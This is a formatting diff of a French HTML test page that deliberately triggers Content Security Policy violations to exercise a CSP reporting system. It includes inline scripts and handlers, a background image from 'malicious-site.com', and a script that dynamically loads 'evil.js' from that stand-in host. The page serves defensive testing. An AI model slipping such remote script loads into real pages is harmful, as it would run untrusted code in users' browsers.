@@ -1,37 +1,50 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Test CSP - Violations intentionnelles</title>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Page de test CSP</h1>
-    <p>Cette page va générer plusieurs violations CSP pour tester le système de reporting.</p>
-    
+    <p>
+      Cette page va générer plusieurs violations CSP pour tester le système de
+      reporting.
+    </p>
+
     <h2>Tests de violation :</h2>
-    
+
     <!-- Script inline sans nonce (VIOLATION) -->
     <script>
-        console.log("Script inline sans nonce - VIOLATION CSP");
+      console.log("Script inline sans nonce - VIOLATION CSP");
     </script>
-    
+
     <!-- Image depuis un domaine non autorisé (VIOLATION) -->
-    <img src="https://example.com/test.jpg" alt="Image externe" onerror="console.log('Image failed')">
-    
+    <img
+      src="https://example.com/test.jpg"
+      alt="Image externe"
+      onerror="console.log('Image failed')"
+    />
+
     <!-- Iframe depuis un domaine non autorisé (VIOLATION) -->
     <iframe src="https://example.com"></iframe>
-    
+
     <!-- Style inline avec contenu dangereux (PEUT VIOLER) -->
-    <div style="background: url('https://malicious-site.com/image.jpg')">Test style</div>
-    
-    <button onclick="alert('Inline event handler - VIOLATION')">Click me (VIOLATION)</button>
-    
+    <div
+      style="background: url(&quot;https://malicious-site.com/image.jpg&quot;)"
+    >
+      Test style
+    </div>
+
+    <button onclick="alert('Inline event handler - VIOLATION')">
+      Click me (VIOLATION)
+    </button>
+
     <script>
-        // Tentative de chargement d'un script externe non autorisé
-        const script = document.createElement('script');
-        script.src = 'https://malicious-site.com/evil.js';
-        document.head.appendChild(script);
+      // Tentative de chargement d'un script externe non autorisé
+      const script = document.createElement("script");
+      script.src = "https://malicious-site.com/evil.js";
+      document.head.appendChild(script);
     </script>
-</body>
-</html> 
+  </body>
+</html>
